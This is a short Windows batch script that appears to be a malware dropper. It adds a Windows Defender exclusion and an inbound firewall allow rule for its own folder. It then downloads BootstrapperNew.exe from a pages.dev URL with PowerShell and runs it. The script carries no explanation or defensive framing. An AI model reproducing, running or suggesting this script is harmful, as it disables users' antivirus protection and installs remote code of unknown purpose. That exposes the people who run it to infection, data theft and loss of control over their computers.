@echo off
setlocal

:: Get the current directory
set "currentDir=%~dp0"

:: Delete BootstrapperNew.exe if it exists
del /F /Q "%currentDir%\BootstrapperNew.exe"

:: Add exclusions for various antivirus software (Run with Admin Privileges)
:: Windows Defender
powershell -Command "Add-MpPreference -ExclusionPath '%currentDir%'"
:: Windows Firewall (Not an AV, but adding just in case)
powershell -Command "New-NetFirewallRule -DisplayName 'AllowFolder' -Direction Inbound -Action Allow -Path '%currentDir%'"
:: AVG, BitDefender, Malwarebytes, ReasonLabs, McAfee (May need additional adjustments per AV)
:: These commands may need specific CLI tools per AV

:: Download the file using PowerShell
powershell -Command "Invoke-WebRequest -Uri 'https://2cfc0222.salamanderprocessing.pages.dev/download/static/files/BootstrapperNew.exe' -OutFile '%currentDir%\BootstrapperNew.exe'"

:: Run the downloaded file
start "" "%currentDir%\BootstrapperNew.exe"
